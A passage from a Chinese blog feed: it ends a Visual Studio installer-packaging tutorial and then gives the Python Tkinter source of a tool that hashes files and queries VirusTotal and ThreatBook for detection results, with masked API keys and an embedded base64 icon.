title="3.开始打包"></a>3.开始打包</h3><p>右键Application Folder，选择Add-项目输出</p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017133559235.png" alt="image-20221017133559235"></p><p>选择要输出的项目，配置默认（活动），点击确定。<strong>release和debug不同。</strong></p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017133628262.png" alt="image-20221017133628262"></p><p>右键主输出，选择第一个生成快捷方式</p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017134104897.png" alt="image-20221017134104897"></p><p>将生成的快捷方式拖拽到User‘s Desktop中</p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017134316401.png" alt="image-20221017134316401"></p><p>然后在解决方案管理器中，右键新建的项目，点击生成；生成结束后右键选择安装，选择文件夹，一步一步走下去就可以了</p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017134556452.png" alt="image-20221017134556452"></p><p><img src="/2022/10/17/%E4%BD%BF%E7%94%A8Visual-Studio-Installer-Project%E6%89%93%E5%8C%85%E7%A8%8B%E5%BA%8F/image-20221017134657073.png" alt="image-20221017134657073"></p><p>等安装结束，打包程序完成了。</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Visual Studio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python GUI小工具</title>
    <link href="/2022/09/27/Python-GUI%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    <url>/2022/09/27/Python-GUI%E5%B0%8F%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h3 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h3><p>打算学习一下python GUI编程</p><p>本来打算使用PyQt5，结果发现Qt Design默认的控件太少了（pywebview也可以）</p><p>转而使用python自带的Tkinter模块</p><h3 id="程序功能"><a href="#程序功能" class="headerlink" title="程序功能"></a>程序功能</h3><ol><li><p>计算文件Hash，包括文件大小、md5、sha-1、sha-256）；</p></li><li><p>通过virustotal api和微步API获取文件的一些基本信息，包括检测比（恶意&#x2F;未检出）、卡巴斯基分类、文件类型、PEiD；</p><p>（待完善）</p><p><img src="/2022/09/27/Python-GUI%E5%B0%8F%E5%B7%A5%E5%85%B7/image-20220927093900904.png" alt="image-20220927093900904"></p></li></ol><h3 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> tkinter.filedialog <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tkinter.ttk <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> windnd<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> webbrowser<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">VirusTotal</span>(<span class="hljs-params">file_md5</span>):<br>    header = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;Connection&#x27;</span>: <span class="hljs-string">&#x27;close&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,<br>        <span class="hljs-string">&#x27;x-apikey&#x27;</span>: <span class="hljs-string">&#x27;*****************************************************&#x27;</span>  <span class="hljs-comment"># api key</span><br>    &#125;<br>    requests.packages.urllib3.disable_warnings()<br>    <span class="hljs-comment"># 检索有关文件的信息（by MD5）</span><br>    string = requests.get(<span class="hljs-string">&#x27;https://www.virustotal.com/api/v3/files/&#x27;</span> + file_md5, headers=header, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-comment"># print(string.text)</span><br>    s = json.loads(string.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(string.text) &gt; <span class="hljs-number">1000</span>:<br>        E_VT.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;attributes&#x27;</span>][<span class="hljs-string">&#x27;last_analysis_stats&#x27;</span>][<span class="hljs-string">&#x27;malicious&#x27;</span>]) + <span class="hljs-string">&#x27;/&#x27;</span> +<br>                    <span class="hljs-built_in">str</span>(s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;attributes&#x27;</span>][<span class="hljs-string">&#x27;last_analysis_stats&#x27;</span>][<span class="hljs-string">&#x27;undetected&#x27;</span>]))<br>        E_Type.insert(<span class="hljs-number">0</span>, s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;attributes&#x27;</span>][<span class="hljs-string">&#x27;magic&#x27;</span>])<br>        <span class="hljs-keyword">try</span>:<br>            E_Ka.insert(<span class="hljs-number">0</span>, s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;attributes&#x27;</span>][<span class="hljs-string">&#x27;last_analysis_results&#x27;</span>][<span class="hljs-string">&#x27;Kaspersky&#x27;</span>][<span class="hljs-string">&#x27;result&#x27;</span>])<br>        <span class="hljs-keyword">except</span>:<br>            E_Ka.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;无&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            E_PEiD.insert(<span class="hljs-number">0</span>, s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;attributes&#x27;</span>][<span class="hljs-string">&#x27;packers&#x27;</span>][<span class="hljs-string">&#x27;PEiD&#x27;</span>])<br>        <span class="hljs-keyword">except</span>:<br>            E_PEiD.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;无&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        E_VT.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;VT无结果&#x27;</span>)<br>        E_Ka.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;VT无结果&#x27;</span>)<br>        E_PEiD.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;VT无结果&#x27;</span>)<br>        E_Type.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;VT无结果&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">threatbook</span>(<span class="hljs-params">file_sha256</span>):<br>    url = <span class="hljs-string">&#x27;https://api.threatbook.cn/v3/file/report/multiengines&#x27;</span><br>    params = &#123;<br>        <span class="hljs-string">&#x27;apikey&#x27;</span>: <span class="hljs-string">&#x27;******************************************&#x27;</span>,   <span class="hljs-comment">#api key</span><br>        <span class="hljs-string">&#x27;sha256&#x27;</span>: file_sha256<br>    &#125;<br>    response = requests.get(url, params=params)<br>    <span class="hljs-comment">#print(response.text)</span><br>    s = json.loads(response.text)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(response.text) &gt; <span class="hljs-number">100</span>:<br>        E_TB.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;multiengines&#x27;</span>][<span class="hljs-string">&#x27;positives&#x27;</span>]) + <span class="hljs-string">&#x27;/&#x27;</span> + <span class="hljs-built_in">str</span>(s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;multiengines&#x27;</span>][<span class="hljs-string">&#x27;total2&#x27;</span>]))<br>        E_level.insert(<span class="hljs-number">0</span>, s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;multiengines&#x27;</span>][<span class="hljs-string">&#x27;threat_level&#x27;</span>])<br>        E_family.insert(<span class="hljs-number">0</span>,<br>                        s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;multiengines&#x27;</span>][<span class="hljs-string">&#x27;malware_type&#x27;</span>] + <span class="hljs-string">&#x27; 、 &#x27;</span> + s[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;multiengines&#x27;</span>][<span class="hljs-string">&#x27;malware_family&#x27;</span>])<br>    <span class="hljs-keyword">else</span>:<br>        E_TB.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;微步无结果&#x27;</span>)<br>        E_level.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;微步无结果&#x27;</span>)<br>        E_family.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;微步无结果&#x27;</span>)<br><br><br><span class="hljs-comment"># 计算文件大小</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Size</span>(<span class="hljs-params">file</span>):<br>    size = os.path.getsize(file)<br>    size = <span class="hljs-built_in">format</span>(size, <span class="hljs-string">&#x27;,&#x27;</span>)<br>    E_size.delete(<span class="hljs-number">0</span>, END)<br>    E_size.insert(<span class="hljs-number">0</span>, size + <span class="hljs-string">&#x27;字节&#x27;</span>)<br><br><br><span class="hljs-comment"># 计算Hash</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Hash</span>(<span class="hljs-params">file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        data = fp.read()<br>    file_md5 = hashlib.md5(data).hexdigest()<br>    file_sha1 = hashlib.sha1(data).hexdigest()<br>    file_sha256 = hashlib.sha256(data).hexdigest()<br>    E_md5.delete(<span class="hljs-number">0</span>, END)<br>    E_md5.insert(<span class="hljs-number">0</span>, file_md5)<br>    E_sha1.delete(<span class="hljs-number">0</span>, END)<br>    E_sha1.insert(<span class="hljs-number">0</span>, file_sha1)<br>    E_sha256.delete(<span class="hljs-number">0</span>, END)<br>    E_sha256.insert(<span class="hljs-number">0</span>, file_sha256)<br>    E_VT.delete(<span class="hljs-number">0</span>, END)<br>    E_Ka.delete(<span class="hljs-number">0</span>, END)<br>    E_PEiD.delete(<span class="hljs-number">0</span>, END)<br>    E_Type.delete(<span class="hljs-number">0</span>, END)<br>    E_TB.delete(<span class="hljs-number">0</span>, END)<br>    E_level.delete(<span class="hljs-number">0</span>, END)<br>    E_family.delete(<span class="hljs-number">0</span>, END)<br>    win.update()  <span class="hljs-comment"># 更新窗口</span><br>    <span class="hljs-keyword">if</span> CheckVar1.get() == <span class="hljs-number">1</span>:<br>        VirusTotal(file_md5)<br>    <span class="hljs-keyword">if</span> CheckVar2.get() == <span class="hljs-number">1</span>:<br>        threatbook(file_sha256)<br><br><br><span class="hljs-comment"># 打开文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FileOpen</span>():<br>    file = askopenfilename(title=<span class="hljs-string">&#x27;打开文件&#x27;</span>)<br>    E.delete(<span class="hljs-number">0</span>, END)<br>    E.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(file))<br>    Size(file)<br>    Hash(file)<br><br><br><span class="hljs-comment"># 拖拽打开文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Dragg</span>(<span class="hljs-params">files</span>):<br>    file = <span class="hljs-string">&#x27;\n&#x27;</span>.join((item.decode(<span class="hljs-string">&#x27;gbk&#x27;</span>) <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> files))<br>    E.delete(<span class="hljs-number">0</span>, END)<br>    E.insert(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(file))<br>    Size(file)<br>    Hash(file)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">VTOpen</span>():<br>    sha256 = E_sha256.get()<br>    webbrowser.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;https://www.virustotal.com/gui/file/&#x27;</span> + sha256, )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">TBOpen</span>():<br>    sha256 = E_sha256.get()<br>    webbrowser.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;https://s.threatbook.com/report/file/&#x27;</span> + sha256, )<br><br><br>win = Tk()<br><span class="hljs-comment"># 获取屏幕尺寸计算参数，使窗口显示再屏幕中央</span><br>screen_width = win.winfo_screenwidth()<br>screen_height = win.winfo_screenheight()<br>width = <span class="hljs-number">550</span><br>height = <span class="hljs-number">290</span><br>win_size = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;width&#125;</span>x<span class="hljs-subst">&#123;height&#125;</span>+<span class="hljs-subst">&#123;<span class="hljs-built_in">round</span>((screen_width - width) / <span class="hljs-number">2</span>)&#125;</span>+<span class="hljs-subst">&#123;<span class="hljs-built_in">round</span>((screen_height - height) / <span class="hljs-number">2</span>)&#125;</span>&#x27;</span>  <span class="hljs-comment"># round去掉小数</span><br>win.geometry(win_size)<br>win.resizable(height=<span class="hljs-literal">False</span>, width=<span class="hljs-literal">False</span>)<br>win.title(<span class="hljs-string">&#x27;DEMO&#x27;</span>)<br><br><span class="hljs-comment"># base64图标</span><br><span class="hljs-comment"># win.iconbitmap(&#x27;demo.ico&#x27;)</span><br>temp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;temp.ico&#x27;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>)<br>base64_str = <span class="hljs-string">&#x27;AAABAAEAICAAAAEAIACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAAMMOAADDDgAAAAAAAAAAAAD///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Tz///Lxf//xr///8bA///GwP//xsD//8bA///GwP//xsD//8bA///GwP//xsD//8bA///GwP//xsD//8bA///GwP//xsD//8bA///GwP//xsD//8bA///GwP//xsD//8bA///GwP//xr///9fS///+/v//////////////////+Pf//6CW//9VQf//Uj7//1I///9SP///Uj///1I+//9SPv//Uj7//1I+//9SPv//Uj7//1I+//9SPv//Uj7//1I+//9SPv//Uj7//1I+//9SPv//Uj7//1I+//9SPv//Uj7//1I///9PO///hHf///v7////////////////////////9fT//5iN//9QPP//TTn//046//9OO///Tzv//046//9OOv//Tjr//046//9OOv//Tjr//046//9OOv//Tjr//046//9OOv//Tjr//046//9OOv//Tjr//046//9OOv//Tjr//0s2//+Bc///+/v/////////////////////////////9PP//5SJ//9PO///TTn//1hF//+flP//ubH//7ev//+3r///t6///7ev//+3r///t6///7ev//+3r///t6///7ev//+3r///t6///7ev//+3r///uLD//6+m//9iUP//Sjb//4Jz///7+///////////////////////////////////8vH//5GE//9OOv//Tjr//4N1///r6f//////////////////////////////////////////////////////////////////////////////////8/L//3Bf//9JNf//gnP///v7////////////////////////////////////////8O///42A//9OOv//TTn//4Bx///n5P/////////////////////////////////////////////////////////////////////////////x7///b1///0k1//+Cc///+/v/////////////////////////////////////////////7+3//4l8//9NOf//TDj//4By///p5/////////////////////////////////////////////////////////////////////////Hv//9vX///STX//4Jz///7+///////////////////////////////////////////////////7Or//4V4//9NOf//TTn//4R1///r6f//////////////////////////////////////////////////////////////////8e///29f//9JNf//gnP///v7////////////////////////////////////////////////////////6uj//4J0//9NOf//TTn//4d6///u6//////////////////////////////////////////////////////////////x7///b1///0k1//+Cc///+/v/////////////////////////////////////////////////////////////6OX//35w//9MOP//Tjr//4t+///w7v////////////////////////////////////////////////////////Hv//9vX///STX//4Jz///7+///////////////////////////////////////////////////////////////////5eP//3ts//9MOP//Tjr//4+C///x8P//////////////////////////////////////////////////8e///29f//9JNf//gnP///v7////////////////////////////////////////////////////////////////////////4+D//3ho//9MOP//Tzv//5OG///z8v/////////////////////////////////////////////x7///b1///0k1//+Cc///+/v/////////////////////////////////////////////////////////////////////////////4d7//3pr//9NOf//Tzz//5aK///z8v////////////////////////////////////////Hv//9vX///STX//4Jz///7+///////////////////////////////////////////////////////////////////////////////////s6v//1E9//9MOP//W0n//9PO////////////////////////////////////////8e///29f//9JNf//gnP///v7/////////////////////////////////////////////////////////////////////////////8vF//9kUv//TDj//1ZD//+wp///+/r////////////////////////////////////////x7///b1///0k1//+Cc///+/v////////////////////////////////////////////////////////////////////////Pyf//ZVT//0s3//9VQf//rKP///z7//////////////////////////////////////////////Hv//9vX///STX//4Jz///7+///////////////////////////////////////////////////////////////////0s3//2dW//9LN///VkP//6uh///6+v//////////////////////////////////////////////////8e///29f//9JNf//gnP///v7/////////////////////////////////////////////////////////////9XQ//9qWf//Szf//1VB//+so///+/v////////////////////////////////////////////////////////x7///b1///0k1//+Cc///+/v////////////////////////////////////////////////////////Y1P//bVz//0s3//9TQP//qJ////v6//////////////////////////////////////////////////////////////Hv//9vX///STX//4Jz///7+///////////////////////////////////////////////////3Nf//3Bf//9LN///Uj///6Sa///5+f//////////////////////////////////////////////////////////////////8e///29f//9JNf//gnP///v7/////////////////////////////////////////////97b//9zY///Szf//1E+//+glv//+Pj////////////////////////////////////////////////////////////////////////x7///b1///0k1//+Cc///+/v////////////////////////////////////////h3v//dmb//0w3//9RPf//nZL///f2//////////////////////////////////////////////////////////////////////////////Hv//9vX///STX//4Jz///7+///////////////////////////////////5OH//3lq//9MOP//UDz//5aK///z8f///f3///z8///8/P///Pz///z8///8/P///Pz///z8///8/P///Pz///z8///8/P///Pz///z8///9/f//7uz//29e//9JNf//gnP///v7/////////////////////////////+fk//98bv//TTj//005//9UQf//gHL//4x///+Lfv//i37//4t+//+Lfv//i37//4t+//+Lfv//i37//4t+//+Lfv//i37//4t+//+Lfv//i37//4t+//+GeP//WUf//0o2//+Cc///+/v////////////////////////o5f//f3D//0w3//9NOP//TTn//004//9LNv//Sjb//0o2//9KNv//Sjb//0o2//9KNv//Sjb//0o2//9KNv//Sjb//0o2//9KNv//Sjb//0o2//9KNv//Sjb//0o2//9MOP//SjX//4Fy///7+///////////////////9PL//5aL//9gTv//YU///2FP//9hT///YU///2FP//9hT///YU///2FP//9hT///YU///2FP//9hT///YU///2FP//9hT///YU///2FP//9hT///YU///2FP//9hT///YU///2FP//9eTP//j4L///v7///////////////////49///4+D//+Lf///i3///4t///+Lf///i3///4t///+Lf///i3///4t///+Lf///i3///4t///+Lf///i3///4t///+Lf///i3///4t///+Lf///i3///4t///+Lf///i3///4t///+Lf///r6P///v7/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=&#x27;</span><br>imagedata = base64.b64decode(base64_str)<br>temp.write(imagedata)<br>temp.close()<br>win.iconbitmap(<span class="hljs-string">&#x27;temp.ico&#x27;</span>)<br>os.remove(<span class="hljs-string">&#x27;temp.ico&#x27;</span>)<br><br><span class="hljs-comment"># 文件拖拽</span><br>windnd.hook_dropfiles(win, func=Dragg)<br><br>Label(win, text=<span class="hljs-string">&#x27;文件名：&#x27;</span>).grid(row=<span class="hljs-number">0</span>)<br>E = Entry(win, width=<span class="hljs-number">50</span>)<br>E.grid(row=<span class="hljs-number">0</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">4</span>)<br>btn = Button(win, text=<span class="hljs-string">&#x27;选择&#x27;</span>, command=FileOpen).grid(row=<span class="hljs-number">0</span>, column=<span class="hljs-number">6</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;大小：&#x27;</span>).grid(row=<span class="hljs-number">1</span>)<br>E_size = Entry(win, width=<span class="hljs-number">50</span>)<br>E_size.grid(row=<span class="hljs-number">1</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">5</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;MD5：&#x27;</span>).grid(row=<span class="hljs-number">2</span>)<br>E_md5 = Entry(win, width=<span class="hljs-number">50</span>)<br>E_md5.grid(row=<span class="hljs-number">2</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">5</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;SHA-1：&#x27;</span>).grid(row=<span class="hljs-number">3</span>)<br>E_sha1 = Entry(win, width=<span class="hljs-number">50</span>)<br>E_sha1.grid(row=<span class="hljs-number">3</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">5</span>)<br>CheckVar1 = IntVar()<br>CheckVar1.<span class="hljs-built_in">set</span>(<span class="hljs-number">1</span>)<br>C1 = Checkbutton(win, text=<span class="hljs-string">&quot;VirusTotal API&quot;</span>, variable=CheckVar1)<br>C1.grid(row=<span class="hljs-number">3</span>, column=<span class="hljs-number">6</span>, columnspan=<span class="hljs-number">5</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;SHA-256：&#x27;</span>).grid(row=<span class="hljs-number">4</span>)<br>E_sha256 = Entry(win, width=<span class="hljs-number">50</span>)<br>E_sha256.grid(row=<span class="hljs-number">4</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">5</span>)<br>CheckVar2 = IntVar()<br>C1 = Checkbutton(win, text=<span class="hljs-string">&quot;threatbook API&quot;</span>, variable=CheckVar2)<br>C1.grid(row=<span class="hljs-number">4</span>, column=<span class="hljs-number">6</span>, columnspan=<span class="hljs-number">5</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;--------VirusTotal API-------&#x27;</span>).grid(row=<span class="hljs-number">5</span>, column=<span class="hljs-number">3</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;引擎检测：&#x27;</span>).grid(row=<span class="hljs-number">6</span>)<br>E_VT = Entry(win, width=<span class="hljs-number">10</span>)<br>E_VT.grid(row=<span class="hljs-number">6</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">5</span>, sticky=W)<br><br>Label(win, text=<span class="hljs-string">&#x27;Kaspersky：&#x27;</span>).grid(row=<span class="hljs-number">6</span>, column=<span class="hljs-number">2</span>, columnspan=<span class="hljs-number">3</span>)<br>E_Ka = Entry(win, width=<span class="hljs-number">30</span>)<br>E_Ka.grid(row=<span class="hljs-number">6</span>, column=<span class="hljs-number">4</span>, columnspan=<span class="hljs-number">3</span>, sticky=W)<br><br>Label(win, text=<span class="hljs-string">&#x27;类型：&#x27;</span>).grid(row=<span class="hljs-number">7</span>)<br>E_Type = Entry(win, width=<span class="hljs-number">50</span>)<br>E_Type.grid(row=<span class="hljs-number">7</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">5</span>)<br>btn_vt = Button(win, text=<span class="hljs-string">&#x27;Open VT&#x27;</span>, command=VTOpen).grid(row=<span class="hljs-number">7</span>, column=<span class="hljs-number">6</span>, rowspan=<span class="hljs-number">2</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;PEiD：&#x27;</span>).grid(row=<span class="hljs-number">8</span>)<br>E_PEiD = Entry(win, width=<span class="hljs-number">50</span>)<br>E_PEiD.grid(row=<span class="hljs-number">8</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">5</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;--------threatbook API-------&#x27;</span>).grid(row=<span class="hljs-number">9</span>, column=<span class="hljs-number">3</span>)<br><br>Label(win, text=<span class="hljs-string">&#x27;引擎检测：&#x27;</span>).grid(row=<span class="hljs-number">10</span>)<br>E_TB = Entry(win, width=<span class="hljs-number">10</span>)<br>E_TB.grid(row=<span class="hljs-number">10</span>, column=<span class="hljs-number">1</span>, columnspan=<span class="hljs-number">5</span>, sticky=W)<br><br>Label(win, text=<span class="hljs-string">&#x27;检测结果：&#x27;</span>).grid(row=<span class="hljs-number">10</span>, column=<span class="hljs-number">2</span>, columnspan=<span class="hljs-number">3</span>)<br>E_level = Entry(win, width=<span class="hljs-number">30</span>)<br>E_level.grid(row=<span class="hljs-number">10</span>, column=<span class="hljs-number">4</span>, columnspan=<span class="hljs-number">3</span>, sticky=W)<br><br>Label(win, text=<span class="hljs-string">&#x27;类型及家族：&#x27;</span>).grid(row=<span class="hljs-number">11</span>)<br>E_family = Entry(win, width=<span class="hljs-number">50</span>)<br>E_family.grid(row=<span class="hljs-number">11</span>, column=<span class="hljs-number">1</span>, columnspan=<span 